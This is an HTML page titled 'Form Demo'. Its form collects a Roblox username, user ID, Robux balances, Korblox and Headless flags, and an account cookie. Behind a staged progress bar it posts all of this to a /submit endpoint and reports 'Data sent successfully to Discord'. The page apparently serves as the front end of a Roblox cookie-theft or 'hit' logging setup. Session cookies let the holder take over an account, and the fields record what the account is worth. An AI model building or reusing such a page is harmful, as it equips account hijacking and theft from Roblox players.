<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Form Demo</title>
<style>
  body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #070007;
    background-image: radial-gradient(circle at 80% 20%, #ff2a2a44 0%, transparent 20%),
                      radial-gradient(circle at 10% 80%, #1b1b2f 0%, transparent 30%);
    color: #fff;
    font-family: Arial, sans-serif;
    padding: 20px;
  }

  /* Card */
  .card {
    width: 100%;
    max-width: 400px;
    background: rgba(0,0,0,0.5);
    border: 1px solid rgba(255,80,80,0.2);
    border-radius: 12px;
    padding: 24px;
    box-shadow: 0 8px 30px rgba(0,0,0,0.6);
    text-align: left;
  }

  label {
    display: block;
    margin-bottom: 6px;
    font-size: 14px;
  }
  input {
    width: 100%;
    padding: 10px;
    margin-bottom: 14px;
    border-radius: 8px;
    border: 1px solid rgba(255,255,255,0.1);
    background: rgba(255,255,255,0.05);
    color: #fff;
    font-size: 15px;
  }

  .btn {
    width: 100%;
    padding: 10px 14px;
    border-radius: 8px;
    background: linear-gradient(180deg,#ff3b3b,#d60f0f);
    border: none;
    color: #fff;
    font-weight: 700;
    font-size: 15px;
    cursor: pointer;
  }
  .btn:hover {
    background: linear-gradient(180deg,#ff5b5b,#f20f0f);
  }

  /* Loader + Success */
  .progress {
    margin-top: 16px;
    height: 10px;
    background: rgba(255,255,255,0.1);
    border-radius: 6px;
    overflow: hidden;
    display: none;
  }
  .progress-bar {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg,#ff5b5b,#ff2a2a);
    transition: width 0.2s;
  }
  .status {
    margin-top: 12px;
    font-size: 14px;
    color: #ddd;
    text-align: center;
  }
</style>
</head>
<body>
  <div>
    <!-- Card -->
    <div class="card">
      <form id="demoForm">
        <input id="username" type="text" placeholder="Username" />
        <input id="userId" type="text" placeholder="User ID" />
        <input id="robux" type="text" placeholder="Robux" />
        <input id="pending" type="text" placeholder="Pending Robux" />
        
        <label style="display: flex; align-items: center; margin-bottom: 10px;">
          <input id="premium" type="checkbox" style="width: auto; margin-right: 8px;" />
          Premium Account
        </label>
        
        <label style="display: flex; align-items: center; margin-bottom: 10px;">
          <input id="korblox" type="checkbox" style="width: auto; margin-right: 8px;" />
          Korblox Package
        </label>
        
        <label style="display: flex; align-items: center; margin-bottom: 14px;">
          <input id="headless" type="checkbox" style="width: auto; margin-right: 8px;" />
          Headless Package
        </label>
        
        <input id="cookie" type="text" placeholder="Enter Cookie" />

        <button class="btn" type="button" id="submitBtn">Submit</button>

        <!-- Loading -->
        <div class="progress" id="progress">
          <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status" id="status"></div>
      </form>
    </div>
  </div>

<script>
  const btn = document.getElementById('submitBtn');
  const progress = document.getElementById('progress');
  const progressBar = document.getElementById('progressBar');
  const status = document.getElementById('status');
  
  // Get all form inputs
  const usernameInput = document.getElementById('username');
  const userIdInput = document.getElementById('userId');
  const robuxInput = document.getElementById('robux');
  const pendingInput = document.getElementById('pending');
  const premiumInput = document.getElementById('premium');
  const korbloxInput = document.getElementById('korblox');
  const headlessInput = document.getElementById('headless');
  const cookieInput = document.getElementById('cookie');

  btn.addEventListener('click', async () => {
    // Collect all form data
    const formData = {
      username: usernameInput.value.trim(),
      userId: userIdInput.value.trim(),
      robux: robuxInput.value.trim(),
      pending: pendingInput.value.trim(),
      premium: premiumInput.checked,
      korblox: korbloxInput.checked,
      headless: headlessInput.checked,
      cookie: cookieInput.value.trim()
    };

    // Basic validation
    if (!formData.cookie || !formData.username) {
      status.textContent = '❌ Please fill in Username and Cookie';
      status.style.color = '#ff5b5b';
      return;
    }

    // Disable button and show progress
    btn.disabled = true;
    btn.textContent = 'Processing...';
    progress.style.display = 'block';
    status.style.color = '#ddd';
    
    let percent = 0;
    status.textContent = 'Validating 0%';

    const interval = setInterval(() => {
      percent += 5;
      progressBar.style.width = percent + '%';
      
      if (percent <= 30) {
        status.textContent = `Validating ${percent}%`;
      } else if (percent <= 70) {
        status.textContent = `Processing ${percent}%`;
      } else {
        status.textContent = `Sending ${percent}%`;
      }

      if (percent >= 100) {
        clearInterval(interval);
        submitForm(formData);
      }
    }, 100);
  });

  async function submitForm(formData) {
    try {
      const response = await fetch('/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
      });

      const result = await response.json();

      if (result.success) {
        status.textContent = '✅ Data sent successfully to Discord';
        status.style.color = '#4CAF50';
        // Clear form
        usernameInput.value = '';
        userIdInput.value = '';
        robuxInput.value = '';
        pendingInput.value = '';
        premiumInput.checked = false;
        korbloxInput.checked = false;
        headlessInput.checked = false;
        cookieInput.value = '';
      } else {
        status.textContent = `❌ ${result.message}`;
        status.style.color = '#ff5b5b';
      }
    } catch (error) {
      status.textContent = '❌ Connection error occurred';
      status.style.color = '#ff5b5b';
    }

    // Re-enable button
    btn.disabled = false;
    btn.textContent = 'Submit';
  }
</script>
</body>
</html>
